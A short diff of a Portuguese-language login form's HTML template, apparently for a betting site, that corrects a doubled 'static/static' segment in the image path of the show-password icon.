@@ -66,7 +66,7 @@
               <div class="pass">
                 <div class="email"><img src="https://wwv.condebet.com/bx_4/public/static/images/pass.png" /></div>
                 <div class="pass_sr"><input id="pass" name="password" type="password" onkeyup="checkContent(this)" placeholder="Senha" /></div>
-                <div class="pass_show"><img src="https://wwv.condebet.com/bx_4/public/static/static/images/show.png"></div>
+                <div class="pass_show"><img src="https://wwv.condebet.com/bx_4/public/static/images/show.png"></div>
               </div>
               <div class="remember">
                   <div class="remember_left">
